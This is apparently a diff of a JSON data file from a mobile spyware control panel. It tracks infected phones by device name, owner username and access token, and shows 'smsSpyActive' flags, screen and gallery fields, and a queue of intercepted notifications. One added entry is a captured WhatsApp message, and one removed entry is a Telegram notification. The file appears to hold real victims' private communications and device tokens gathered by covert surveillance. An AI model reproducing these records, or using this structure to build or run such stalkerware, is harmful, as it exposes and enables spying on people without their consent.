@@ -9586,7 +9586,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776770582931,
+    "lastSeen": 1776770590381,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9627,7 +9627,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776770586681,
+    "lastSeen": 1776770589232,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -9643,6 +9643,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Ara na Zakiii💕🫶💖💌💋",
+        "content": "omongan kamu",
+        "time": "21/04 18:23",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776770590747
+      },
       {
         "appName": "Telegram",
         "sender": "𝗦𝙊𝙇𝘿𝙄𝙀𝙍 𝗕𝙊𝙔 (𝟮𝟬𝟭𝟵) ™",
@@ -13634,14 +13642,6 @@
         "time": "21/04 17:59",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776769143155
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 17:59",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769143036
       }
     ],
     "galleryPhotos": [],
